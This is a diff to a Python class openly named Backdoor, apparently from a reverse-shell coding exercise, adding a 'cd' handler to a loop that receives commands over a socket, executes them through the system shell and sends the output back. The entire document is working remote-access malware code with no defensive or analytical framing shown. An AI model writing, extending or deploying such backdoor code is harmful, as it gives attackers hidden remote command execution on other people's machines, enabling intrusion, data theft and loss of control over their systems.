@@ -3,6 +3,7 @@
 import socket
 import subprocess
 import json
+import os
 
 
 class Backdoor:
@@ -30,14 +31,25 @@ class Backdoor:
     def execute_system_command(self, command):  # bytes -> bytes
         return subprocess.check_output(command, shell=True)
 
+    def change_working_directory_to(self, path):  # str -> str
+        try:
+            os.chdir(path)
+            return f'[+] Changing working directory to {path}'
+        except FileNotFoundError:
+            return f'[-] Path {path} not found'
+
     def run(self):
         while True:
             command = self.reliable_receive()  # str
             if command[0] == 'exit':
                 self.connection.close()
                 exit()
-            command_result = self.execute_system_command(command)  # bytes
-            command_result = command_result.decode(errors='replace')  # str
+            elif command[0] == 'cd' and len(command) > 1:
+                command_result = self.change_working_directory_to(
+                    command[1])  # str
+            else:
+                command_result = self.execute_system_command(command)  # bytes
+                command_result = command_result.decode(errors='replace')  # str
             self.reliable_send(command_result)
 
 
